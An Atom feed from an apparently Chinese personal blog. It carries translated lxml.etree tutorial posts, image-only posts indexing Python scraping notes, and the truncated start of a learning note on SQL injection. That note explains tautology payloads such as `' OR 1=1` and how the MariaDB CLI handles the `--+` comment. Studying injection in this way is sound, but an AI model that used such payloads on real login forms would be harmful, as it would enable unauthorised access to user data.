<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://r0sev.github.io/"/>
  <updated>2019-07-02T08:21:09.000Z</updated>
  <id>https://r0sev.github.io/</id>
  
  <author>
    <name>r0sev</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>lxml.etree tutorial - part two</title>
    <link href="https://r0sev.github.io/2019/07/02/lxml-etree-tutorial-part-two/"/>
    <id>https://r0sev.github.io/2019/07/02/lxml-etree-tutorial-part-two/</id>
    <published>2019-07-02T08:20:00.000Z</published>
    <updated>2019-07-02T08:21:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>翻译 by：pwn4justice</em></p><h2 id="元素（Elements）可以包含文本（TEXT）"><a href="#元素（Elements）可以包含文本（TEXT）" class="headerlink" title="元素（Elements）可以包含文本（TEXT）"></a>元素（Elements）可以包含文本（TEXT）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root&quot;)</span><br><span class="line">&gt;&gt;&gt; root.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.text)</span><br><span class="line">TEXT</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root&gt;TEXT&lt;/root&gt;&apos;</span><br></pre></td></tr></table></figure><p>在许多XML文档（以数据为中心的文档）中，这里是唯一存在”文本”的地方了。一般文本会被包含在位于树层级的最底层的叶子标签中。</p><p>然而，如果XML被用于向（X）HTML这样的”标签文本文档”，那么”文本(TEXT)”可以在不同的标签之间出现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;Hello&lt;br/&gt;World&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里，<code>&lt;br/&gt;</code> 标签被文本包围了。这就是常说的 <em>文档型</em> 或者 <em>混合内容</em> 的XML。Element 类通过其 <strong>tail</strong> 属性来支持这种写法。tail 属性表示在一颗XML树中，紧跟在一个元素后，另一个不同元素前的文本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; html = etree.Element(&quot;html&quot;)</span><br><span class="line">&gt;&gt;&gt; body = etree.SubElement(html, &quot;body&quot;)</span><br><span class="line">&gt;&gt;&gt; body.text = &quot;TEXT&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br = etree.SubElement(body, &quot;br&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br.tail = &quot;TAIL&quot;</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;TAIL&lt;/body&gt;&lt;/html&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>.text</code> 和 <code>.tail</code> 两个属性足以在XML文档中表示所有文本内容。这样一来，ElementTree API 就不需要除了 Element 类之外的任何<strong>特殊文本节点</strong>，通常来说这些<strong>特殊节点</strong>是很碍事的（从<strong>DOM</strong> API中也能窥知一二）。</p><p>然而，tail 文本也有它不方便的地方。比如，当你从树中序列化（serialise）一个元素的时候，你可能并不会希望tail里的文本紧随其后（当然你可能会需要它子元素的tail属性里的文本）。为了达到这个目的，<strong>tostring()</strong>方法可以接收一个关键字参数：<em>with_tail</em> (是bool类型)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(br)</span><br><span class="line">b&apos;&lt;br/&gt;TAIL&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(br, with_tail=False)#lxml.etree only!</span><br><span class="line">b&apos;&lt;br/&gt;&apos;</span><br></pre></td></tr></table></figure><p>如果你仅仅需要一个XML文档中的所有TEXT（而不需要标签），你可以递归的地拼接所有text和tail属性。再一次的，<strong>tostring()</strong> 方法提供了 <em>method</em> 关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(html, method=&quot;text&quot;)</span><br><span class="line">b&apos;TEXTTAIL&apos;</span><br></pre></td></tr></table></figure><h2 id="使用-XPath-查找文本"><a href="#使用-XPath-查找文本" class="headerlink" title="使用 XPath 查找文本"></a>使用 XPath 查找文本</h2><p>另一种在树中提取出文本内容的方式是使用 <strong>XPath</strong> ，它甚至可以帮你将连在一起的文本块（text chunks）分开，并存到一个list里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;string()&quot;)) # lxml.etree only!</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;//text()&quot;)) # lxml.etree only!</span><br><span class="line">[&apos;TEXT&apos;, &apos;TAIL&apos;]</span><br></pre></td></tr></table></figure><p>如果你想经常使用的话，可以将其打包成函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; generate_text_list = etree.XPath(&quot;//text()&quot;) # lxml.etree only!</span><br><span class="line">&gt;&gt;&gt; print generate_text_list(html)</span><br></pre></td></tr></table></figure><p>需要注意，使用XPath返回的字符串结果都是”智能”的对象，他们可以知道自己是属于哪个元素的文本，即知道自己的父亲（源头），通过<strong>getparent()</strong>方法。就像你对 Element 对象操作的那样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; texts = generate_text_list(html)</span><br><span class="line">&gt;&gt;&gt; print(texts[0])</span><br><span class="line">TEXT</span><br><span class="line">&gt;&gt;&gt; parent = texts[0].getparent();;注意这是对一个&quot;字符串&quot;进行的操作哦</span><br><span class="line">&gt;&gt;&gt; print(parent.tag)</span><br><span class="line">body</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(texts[1])</span><br><span class="line">TAIL</span><br><span class="line">&gt;&gt;&gt; print(texts[1].getparent().tag)</span><br><span class="line">br</span><br></pre></td></tr></table></figure><p>你也可以通过 <code>is_text</code> 和 <code>is_tail</code> 来判断其是text还是tail</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(texts[0].is_text)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_text)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_tail)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>不过虽然这适用于text()函数的结果，但 lxml 是无法告诉您由XPath函数的string()或concat()构造的字符串值的起源（父亲）的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; stringify = etree.XPath(&quot;string()&quot;)</span><br><span class="line">&gt;&gt;&gt; print(stringify(html))</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(stringify(html).getparent())</span><br><span class="line">None</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;翻译 by：pwn4justice&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;元素（Elements）可以包含文本（TEXT）&quot;&gt;&lt;a href=&quot;#元素（Elements）可以包含文本（TEXT）&quot; class=&quot;headerlink&quot; title=&quot;元素（Element
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part one</title>
    <link href="https://r0sev.github.io/2019/06/22/lxml-etree-tutorial-part-one/"/>
    <id>https://r0sev.github.io/2019/06/22/lxml-etree-tutorial-part-one/</id>
    <published>2019-06-22T07:50:17.000Z</published>
    <updated>2019-06-22T08:02:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>翻译 by：pwn4justice</em></p><p>内容：</p><ul><li>‘ Element ‘ 类<ul><li>‘元素集合‘与列表（list）形式的兼容</li><li>元素像字典（dict）那样展现属性</li><li>元素中包含文本</li><li>使用 XPath 查找文本</li><li>树的迭代</li><li>序列化</li></ul></li><li>‘ ElementTree ‘ 类</li><li>从字符串或文件中解析数据<ul><li>fromstring() 方法</li><li>XML() 方法</li><li>解析器对象</li><li>递增解析</li><li>事件驱动的解析</li></ul></li><li>命名空间</li><li>‘ E-factory ‘</li><li>ElementPath （元素路径）</li></ul><p>一个常用的导入 lxml.etree 的方式：<code>from lxml import etree</code></p><p>如果你的代码只使用到了 ElementTree API 的功能而没有用到 lxml.tree 中的任何特有功能，那么你可以使用下面的方法导入 ElementTree 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">  from lxml import etree</span><br><span class="line">  print(&quot;running with lxml.etree&quot;)</span><br><span class="line">except ImportError:</span><br><span class="line">  try:</span><br><span class="line">    # Python 2.5</span><br><span class="line">    import xml.etree.cElementTree as etree</span><br><span class="line">    print(&quot;running with cElementTree on Python 2.5+&quot;)</span><br><span class="line">  except ImportError:</span><br><span class="line">    try:</span><br><span class="line">      # Python 2.5</span><br><span class="line">      import xml.etree.ElementTree as etree</span><br><span class="line">      print(&quot;running with ElementTree on Python 2.5+&quot;)</span><br><span class="line">    except ImportError:</span><br><span class="line">      try:</span><br><span class="line">        # normal cElementTree install</span><br><span class="line">        import cElementTree as etree</span><br><span class="line">        print(&quot;running with cElementTree&quot;)</span><br><span class="line">      except ImportError:</span><br><span class="line">        try:</span><br><span class="line">          # normal ElementTree install</span><br><span class="line">          import elementtree.ElementTree as etree</span><br><span class="line">          print(&quot;running with ElementTree&quot;)</span><br><span class="line">        except ImportError:</span><br><span class="line">          print(&quot;Failed to import ElementTree from any known place&quot;)</span><br></pre></td></tr></table></figure><h3 id="Element-类"><a href="#Element-类" class="headerlink" title="Element 类"></a>Element 类</h3><p> <code>Element</code> 类是 ElementAPI 的主要容器对象，大多数 XML 树功能都可以通过这个类访问。通过<code>Element()</code>可以很容易创建元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&apos;root_tag&apos;)</span><br></pre></td></tr></table></figure><p>使用 tag 属性访问XML的标签名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print root.tag</span><br><span class="line">root_tag</span><br></pre></td></tr></table></figure><p>元素是用XML树结构组织的，你可以使用 <code>append()</code> 方法来创建一个子元素并添加到父元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root.append( etree.Element(&apos;child1_tag&apos;) )</span><br></pre></td></tr></table></figure><p>然而还有一个更高效的方法来做上面这件事，即使用 <code>SubElement</code> 工厂（此处工厂：factory，意指某个类的初始化方法），但是，该方法需要将“父元素”变量作为它的第一个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child2 = etree.SubElement(root, &quot;child2_tag&quot;)</span><br><span class="line">&gt;&gt;&gt; child3 = etree.SubElement(root, &quot;child3_tag&quot;)</span><br></pre></td></tr></table></figure><p>可以通过如下步骤序列化你创建的这棵树，来看见真正的XML效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.tostring(root, pretty_print=True))</span><br><span class="line">&lt;root_tag&gt;</span><br><span class="line">  &lt;child1_tag/&gt;</span><br><span class="line">  &lt;child2_tag/&gt;</span><br><span class="line">  &lt;child3_tag/&gt;</span><br><span class="line">&lt;/root_tag&gt;</span><br></pre></td></tr></table></figure><h3 id="元素即列表"><a href="#元素即列表" class="headerlink" title="元素即列表"></a>元素即列表</h3><p>为了更简单和直观的访问子元素，该模块尽可能地模仿了 Python 的 list 的行为，每个元素都像是一个列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child = root[0]</span><br><span class="line">&gt;&gt;&gt; print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(len(root))</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.index(root[1]) # lxml.etree only!</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; children = list(root)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for child in root:</span><br><span class="line">...     print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line">child2_tag</span><br><span class="line">child3_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.insert(0, etree.Element(&quot;child0_tag&quot;))</span><br><span class="line">&gt;&gt;&gt; start = root[:1]//该方法返回列表,尽管列表中只有一个元素!</span><br><span class="line">&gt;&gt;&gt; end   = root[-1:]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(start[0].tag)</span><br><span class="line">child0_tag</span><br><span class="line">&gt;&gt;&gt; print(end[0].tag)</span><br><span class="line">child3_tag</span><br></pre></td></tr></table></figure><p>在 ElementTree 1.3 和 lxml 2.0 之前，你可以通过如下方式查看某个元素是否有子节点，如果有，则为真：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if root:</span><br><span class="line">print &quot;有子节点&quot;</span><br></pre></td></tr></table></figure><p>不过这种方式不支持在未来使用了，应当改用 <code>len(element)</code> 这种方式，才会更少出错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.iselement(root))  # 测试是否是 Element</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; if len(root):                 # 测试是否有孩子</span><br><span class="line">...     print(&quot;The root element has children&quot;)</span><br><span class="line">The root element has children</span><br></pre></td></tr></table></figure><p>在 lxml(2.0+) 版本中，Element 的一个特殊的行为表现的和原始的 ElementTree（1.3- 或者 Python 2.7/3.2中）或者 list 不同，即赋值操作 <code>root[0] = root[-1]</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child0 at 0x102c0c368&gt;</span><br><span class="line">child0</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;</span><br><span class="line">child3</span><br><span class="line">&gt;&gt;&gt; root[0] = root[-1]</span><br><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;//注意此处的地址</span><br><span class="line">child3</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br></pre></td></tr></table></figure><p>而在 list 中的行为是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; l = [0, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; l[0] = l[-1]</span><br><span class="line">&gt;&gt;&gt; l</span><br><span class="line">[3, 1, 2, 3]//复制，而不是直接移动</span><br></pre></td></tr></table></figure><p>在早期的 ElementTree 中，Element 对象有着和 list 一样的表现，但是有个缺点就是：当你这样做之后，修改其中一个拥有多份拷贝的 Element 时，其余的也会被修改。</p><p>这个小小的不同有一个好处，就是：用 lxml.tree 创建的 Element 总是只有一个父亲，可以用 <code>getparent()</code> 得到，且这在 ElementTree 中是不被支持的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root is root[0].getparent()  # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>那当你只想拷贝时怎么办？凉拌。先用 etree.Element() 创建一个全新的对象，再用Python自带的 copy 模块来复制 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from copy import deepcopy</span><br><span class="line">&gt;&gt;&gt; element = etree.Element(&quot;temproray_store_tags&quot;)</span><br><span class="line">&gt;&gt;&gt; element = append( deepcopy(root[1]) )</span><br><span class="line">&gt;&gt;&gt; print(element[0].tag)</span><br><span class="line">child1_tag</span><br><span class="line">&gt;&gt;&gt; print([ c.tag for c in root ])</span><br><span class="line">[&apos;child3_tag&apos;, &apos;child1_tag&apos;, &apos;child2_tag&apos;]</span><br></pre></td></tr></table></figure><p>兄弟节点可以用 <code>getprevious()</code> 或者 <code>getnext()</code> 反问到：只有在使用 lxml.etree 创建的元素上有效!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root[0] is root[1].getprevious() # lxml.etree only!</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; root[1] is root[0].getnext() # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="元素像字典（dict）那样展现属性"><a href="#元素像字典（dict）那样展现属性" class="headerlink" title="元素像字典（dict）那样展现属性"></a>元素像字典（dict）那样展现属性</h3><p>XML 元素支持属性，可以在Element工厂中直接创建属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root_tag&quot;, interesting=&quot;totally&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot;/&gt;&apos;</span><br></pre></td></tr></table></figure><p>属性只是无序的键值对，所以可以使用类字典的接口来访问他们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(root.get(&quot;interesting&quot;))</span><br><span class="line">totally</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; root.set(&quot;href&quot;, &quot;www.baidu.com&quot;)</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">www.baidu.com</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot; href=&quot;www.baidu.com&quot;/&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; sorted(root.keys())</span><br><span class="line">[&apos;href&apos;, &apos;interesting&apos;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for name, value in sorted(root.items()):</span><br><span class="line">...     print(&apos;%s = %r&apos; % (name, value))</span><br><span class="line">href = &apos;www.baidu.com&apos;</span><br><span class="line">interesting = &apos;totally&apos;</span><br></pre></td></tr></table></figure><p>如果你想使用类字典的形式来访问属性的话，可以使用 Element 的 <code>attrib</code> 属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; attributes = root.attrib//type(attributes) == &lt;type &apos;lxml.etree._Attrib&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;interesting&quot;])</span><br><span class="line">totally</span><br><span class="line">&gt;&gt;&gt; print(attributes.get(&quot;src&quot;))</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; attributes[&quot;src&quot;] = &quot;source_src&quot;</span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;src&quot;])</span><br><span class="line">source_src</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;src&quot;))</span><br><span class="line">source_src</span><br></pre></td></tr></table></figure><p>注意：attrib 是一个类字典(不是真正的 dict 对象)的对象，这意味着对 Element 的所有改变都会被反应到 attrib 对象上，反之亦然。同时，只要有一个 Element 的 attrib 属性在使用中，那么XML树就会一直存在于内存。不过可以使用一个真正的 dict 对象来保存某个 attrib 对象的一份快照，这是不依赖于XML树的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = dict(root.attrib)</span><br><span class="line">&gt;&gt;&gt; sorted(d.items())</span><br><span class="line">[(&apos;href&apos;, &apos;www.baidu.com&apos;), (&apos;interesting&apos;, &apos;totally&apos;)]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;翻译 by：pwn4justice&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘ Element ‘ 类&lt;ul&gt;
&lt;li&gt;‘元素集合‘与列表（list）形式的兼容&lt;/li&gt;
&lt;li&gt;元素像字典（dict）那样展现属性&lt;/li&gt;
&lt;li&gt;元素中包含文本
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python 爬虫知识索引2</title>
    <link href="https://r0sev.github.io/2019/06/20/Python-%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%952/"/>
    <id>https://r0sev.github.io/2019/06/20/Python-爬虫知识索引2/</id>
    <published>2019-06-20T14:46:41.000Z</published>
    <updated>2019-06-20T14:53:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="./python-spider-02.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;./python-spider-02.jpg&quot; alt&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python 爬虫知识索引1</title>
    <link href="https://r0sev.github.io/2019/06/20/Python-%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%951/"/>
    <id>https://r0sev.github.io/2019/06/20/Python-爬虫知识索引1/</id>
    <published>2019-06-20T14:45:47.000Z</published>
    <updated>2019-07-06T07:55:50.913Z</updated>
    
    <content type="html"><![CDATA[<p><img src="./Python-%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%951/python-spider-01.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;./Python-%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%951/python-spider-01.jpg&quot; alt&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL 注入之坑</title>
    <link href="https://r0sev.github.io/2019/06/10/SQL-%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9D%91/"/>
    <id>https://r0sev.github.io/2019/06/10/SQL-注入之坑/</id>
    <published>2019-06-10T09:27:30.000Z</published>
    <updated>2019-06-10T09:30:54.000Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>对WHERE子句的一些浅要理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语句 `SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1;` </span><br><span class="line">相当于：`SELECT * FROM users WHERE username=&apos;admin&apos;;` </span><br><span class="line">和`SELECT * FROM users WHERE 1=1;` 结果的集合，</span><br><span class="line">既返回admin的数据又返回其他用户；</span><br><span class="line"></span><br><span class="line">同理：`SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos; OR 1=1;`</span><br><span class="line">相当于 `SELECT * FROM users WHERE username=&apos;admin&apos; AND password=&apos;&apos;;` </span><br><span class="line">与 `SELECT * FROM users WHERE 1=1;` 的结果结合。</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><code>--+</code> 注释在 MariaDB （5.5.56）命令行中出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT version()===&gt; 5.5.56</span><br><span class="line">&gt;SELECT * FROM users WHERE username=&apos;admin&apos; OR 1=1 --+;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; at line 